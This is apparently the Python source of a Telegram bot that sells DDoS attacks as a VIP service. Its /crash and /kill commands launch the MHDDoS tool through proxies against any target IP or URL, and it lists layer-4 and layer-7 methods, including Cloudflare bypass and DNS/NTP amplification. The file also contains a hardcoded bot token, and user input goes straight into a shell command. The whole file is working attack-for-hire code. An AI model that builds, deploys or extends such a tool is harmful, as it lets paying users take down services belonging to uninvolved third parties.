import telebot
import os
import signal
import subprocess
import requests
import time
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# Telegram Bot Token
TOKEN = "7104470318:AAF9426v-kxZVa34pA7jrXJP4xne6wCJk_E"
bot = telebot.TeleBot(TOKEN)

# Allowed Admins
ALLOWED_USERS = [5705487207]

# VIP Users and tracking
vip_users = {}
active_attacks = {}

# Proxy source for MHDDoS
PROXY_URL = "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt"

def check_target_status(target):
    """Checks if the target server is Up or Down."""
    try:
        if not target.startswith("http"):
            # Clean IP for status check
            check_url = f"http://{target.split(':')[0]}"
        else:
            check_url = target
            
        start_time = time.time()
        response = requests.get(check_url, timeout=7)
        latency = int((time.time() - start_time) * 1000)
        
        if response.status_code == 200:
            return f"UP ✅ ({latency}ms)"
        else:
            return f"UNSTABLE ⚠️ (Code: {response.status_code})"
    except:
        return "DOWN 💀 (No Response)"

@bot.message_handler(commands=['start'])
def handle_start_command(message):
    try:
        user_id = message.from_user.id
        days_left = vip_users.get(user_id, 0)
        status = "VIP MEMBER" if days_left > 0 else "REGULAR USER"

        text = (
            f"🤖 *WELCOME TO THE MHDDoS CLOUD*\n\n"
            f"> *ID:* `{user_id}`\n"
            f"> *STATUS:* `{status}`\n"
            f"> *EXPIRY:* `{days_left} Days`\n\n"
            f"📌 *COMMANDS:*\n"
            f"<blockquote>/crash <METHOD> <IP:PORT> <THREADS> <MS></blockquote>\n"
            f"<blockquote>/kill <URL> (L7 Auto Attack)</blockquote>\n\n"
            f"💡 *EXAMPLE:* `/crash UDP 1.1.1.1:80 10 600`"
        )

        markup = InlineKeyboardMarkup()
        creator_button = InlineKeyboardButton("📱 CREATOR", url="https://t.me/MR3SKR")
        methods_button = InlineKeyboardButton("📜 METHODS LIST", callback_data="show_methods")
        markup.add(creator_button, methods_button)

        bot.send_message(message.chat.id, text, reply_markup=markup, parse_mode="Markdown")
    except Exception as e:
        print(f"Error: {e}")

@bot.callback_query_handler(func=lambda call: call.data == "show_methods")
def show_methods(call):
    methods_text = (
        f"🛡️ *MHDDoS POWERFUL METHODS*\n\n"
        f"🚀 *LAYER 7 (HTTPS):*\n"
        f"<blockquote>CFB, CFBUAM, BYPASS, GET, POST, OVH, STOMP, SLOW, KILLER</blockquote>\n\n"
        f"⚔️ *LAYER 4 (TCP/UDP):*\n"
        f"<blockquote>TCP, UDP, SYN, VSE, MEM, DNS, NTP, ARD, RDP, MINECRAFT</blockquote>\n\n"
        f"🔗 *PROXIES:* `Auto-fetching from GitHub...`"
    )
    markup = InlineKeyboardMarkup()
    back_btn = InlineKeyboardButton("⬅️ BACK", callback_data="back_to_start")
    markup.add(back_btn)
    
    bot.edit_message_text(methods_text, chat_id=call.message.chat.id, 
                          message_id=call.message.message_id, reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data == "back_to_start")
def back_to_start(call):
    handle_start_command(call.message)

@bot.message_handler(commands=['crash'])
def handle_crash_command(message):
    try:
        user_id = message.from_user.id
        if vip_users.get(user_id, 0) <= 0:
            bot.reply_to(message, "🚫 *ERROR:* YOU MUST BE A VIP USER!")
            return

        parts = message.text.split()
        if len(parts) < 5:
            bot.reply_to(message, "⚠️ *USAGE:* `/crash <TYPE> <IP:PORT> <THREADS> <MS>`")
            return

        method, target, threads, duration = parts[1], parts[2], parts[3], parts[4]
        
        # Check status before launching
        status_before = check_target_status(target)

        # Launch MHDDoS with Auto Proxy Link
        command = f"python3 start.py {method} {target} 5 {threads} {PROXY_URL} 10 {duration}"
        process = subprocess.Popen(command, shell=True, preexec_fn=os.setsid)
        
        if user_id not in active_attacks: active_attacks[user_id] = {}
        active_attacks[user_id][target] = process

        response = (
            f"🚀 *ATTACK DEPLOYED SUCCESSFULLY*\n\n"
            f"> *TARGET:* `{target}`\n"
            f"> *METHOD:* `{method}`\n"
            f"> *INITIAL STATUS:* {status_before}\n"
            f"> *TIME:* `{duration}ms`\n\n"
            f"🔴 *USE BUTTON BELOW TO STOP*"
        )

        markup = InlineKeyboardMarkup()
        stop_button = InlineKeyboardButton("🛑 STOP ATTACK", callback_data=f"stop_{target}")
        markup.add(stop_button)

        bot.send_message(message.chat.id, response, reply_markup=markup, parse_mode="Markdown")
    except Exception as e:
        bot.reply_to(message, f"SYSTEM ERROR: {str(e)}")

@bot.callback_query_handler(func=lambda call: call.data.startswith('stop_'))
def stop_attack(call):
    user_id = call.from_user.id
    target = call.data.replace("stop_", "")

    if user_id in active_attacks and target in active_attacks[user_id]:
        process = active_attacks[user_id][target]
        os.killpg(os.getpgid(process.pid), signal.SIGTERM)
        del active_attacks[user_id][target]
        bot.answer_callback_query(call.id, "ATTACK STOPPED!")
        bot.send_message(call.message.chat.id, f"🛑 *ATTACK STOPPED:* `{target}`", parse_mode="Markdown")
    else:
        bot.answer_callback_query(call.id, "NO ACTIVE ATTACK!")

@bot.message_handler(commands=['kill'])
def handle_kill_command(message):
    try:
        user_id = message.from_user.id
        if vip_users.get(user_id, 0) <= 0: return

        target_url = message.text.split()[1]
        status = check_target_status(target_url)
        
        # Auto L7 Attack
        cmd = f"python3 start.py KILLER {target_url} 5 100 {PROXY_URL} 100 300"
        subprocess.Popen(cmd, shell=True, preexec_fn=os.setsid)
        
        bot.reply_to(message, f"✅ *L7 KILLER STARTED*\n\n> *TARGET:* {target_url}\n> *STATUS:* {status}", parse_mode="Markdown")
    except:
        bot.reply_to(message, "⚠️ *USAGE:* `/kill <URL>`")

@bot.message_handler(commands=['addvip'])
def handle_addvip_command(message):
    if message.from_user.id not in ALLOWED_USERS: return
    try:
        _, t_id, days = message.text.split()
        vip_users[int(t_id)] = int(days)
        
        success_msg = (
            f"⭐ *VIP STATUS UPDATED*\n\n"
            f"<blockquote>USER ID: `{t_id}`\n"
            f"DAYS ADDED: `{days}`\n"
            f"STATUS: ACTIVE ✅</blockquote>"
        )
        bot.send_message(message.chat.id, success_msg, parse_mode="Markdown")
    except:
        bot.reply_to(message, "⚠️ *USAGE:* `/addvip <ID> <DAYS>`")

# Optimized for Coolify
print("BOT IS STARTING...")
bot.remove_webhook()
bot.polling(none_stop=True)
